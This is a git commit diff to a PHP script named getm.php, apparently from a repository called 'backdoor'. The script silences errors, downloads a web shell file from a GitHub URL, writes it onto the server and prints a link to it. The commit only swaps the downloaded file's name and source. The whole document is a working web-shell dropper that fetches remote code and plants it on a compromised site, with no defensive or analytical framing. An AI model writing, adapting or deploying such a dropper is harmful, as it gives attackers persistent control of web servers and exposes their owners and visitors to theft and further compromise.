c84540856220a60a52350f20f69fe0a25789ded2
Kakaroot 1337 <38699989+kakaroot1337@users.noreply.github.com>
2023-08-09 10:26:51 +0700

    Update getm.php

--- getm.php
+++ getm.php
@@ -1,8 +1,8 @@
 <?php
 error_reporting(0);
-$shell = fopen("marijuana.php", "w");
-$file_shell = file_get_contents("https://raw.githubusercontent.com/kakaroot1337/backdoor/main/marijuana.php");
+$shell = fopen("juana.php", "w");
+$file_shell = file_get_contents("https://raw.githubusercontent.com/kakaroot1337/backdoor/main/juan1.php");
 fwrite($shell, $file_shell);
 fclose($shell);
-echo "<a href='marijuana.php'>Here Boyz</a>";
+echo "<a href='juana.php'>Here Boyz</a>";
 ?>
